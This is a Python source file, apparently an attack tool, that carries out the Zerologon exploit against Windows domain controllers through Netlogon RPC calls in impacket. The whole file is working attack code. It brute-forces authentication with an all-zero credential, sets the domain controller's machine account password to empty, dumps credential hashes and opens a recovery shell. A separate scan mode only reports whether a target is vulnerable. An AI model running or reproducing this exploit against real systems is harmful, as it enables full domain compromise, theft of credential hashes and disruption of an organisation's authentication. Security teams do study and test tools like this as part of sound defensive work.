from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport
from impacket.smbconnection import SMBConnection
from utils.wmiexec import *
from utils.universal import *
from utils.restorepassword import *
import sys,os

MAX_ATTEMPTS = 2000


def getMachineName(dc_ip):
    try:
        if dc_ip is None:
            raise ValueError('dc_ip cannot be None')
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login('', '')
        machine_name = smb.getServerName()
        dns_domain_name = smb.getServerDNSDomainName()
        return machine_name, dns_domain_name
    except:
        print("[-] SMB failed to identify the machine name and domain name, please specify manually.")
        pass
    finally:
        smb.logoff()

def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )

        # It worked!
        assert server_auth['ErrorCode'] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

def exploit(dc_handle, rpc_con, target_computer):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    request['ClearNewPassword'] = b'\x00' * 516
    return rpc_con.request(request)

def attack(options):
    print('[+] Performing authentication attempts...')
    rpc_con = None
    binding = epm.hept_map(options.dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    for attempt in range(0, MAX_ATTEMPTS):
        result = try_zero_authenticate(rpc_con, f'\\\\{options.dcname}', options.dc_ip, options.dcname)

        if result is None:
            print('=', end='', flush=True)
        else:
            break

    if options.exp:
        if result:
            print('\n[+] Target vulnerable, changing account password to empty string')
            result = None

            for attempt in range(0, MAX_ATTEMPTS):
                try:
                    result = exploit(f'\\\\{options.dcname}', rpc_con, options.dcname)
                except nrpc.DCERPCSessionError as ex:
                    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                    if ex.get_error_code() == 0xc0000022:
                        pass
                    else:
                        fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
                except BaseException as ex:
                    fail(f'Unexpected error: {ex}.')

                if result is None:
                    print('=', end='', flush=True)
                else:
                    break

            print('\n[+] Result: ', end='')
            print(result['ErrorCode'])

            if result['ErrorCode'] == 0:
                print('[+] Exploit complete!\n')

                if not os.path.exists(options.domain):
                    os.mkdir(options.domain)
                outputfile = f'./{options.domain}/{options.dcname}$'
                secretsdump = restore_dump(outputfile,options)
                secretsdump.dumpHash()
                secretsdump.Automatic_recovery_shell()
            else:
                print('[-] Non-zero return code, something went wrong?')
        else:
            print('\n[-] Attack failed. Target is probably patched.')
            sys.exit(1)

    if options.scan:
        if result:
            print('\n[+] Success! DC can be fully compromised by a Zerologon attack.')
        else:
            print('\n[-] Attack failed. Target is probably patched.')
            sys.exit(1)